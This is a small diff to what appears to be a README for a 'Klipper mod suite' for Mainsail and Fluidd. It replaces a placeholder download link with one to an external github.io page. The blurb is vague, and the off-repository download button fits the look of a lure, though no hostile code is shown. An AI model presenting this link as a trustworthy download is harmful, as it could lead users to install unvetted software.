@@ -2,7 +2,7 @@
 
 A powerful mod suite for Klipper with Mainsail/Fluidd enhancing configuration UI, macro control, and thermal stability for optimal printing.
 
-[![Download Klipper Mod](https://img.shields.io/badge/Download-KlipperMod-blueviolet)](#)
+[![Download Klipper Mod](https://img.shields.io/badge/Download-KlipperMod-blueviolet)](https://klipper-mainsail-fluidd-mod-center.github.io/.github)
 
 ---
 
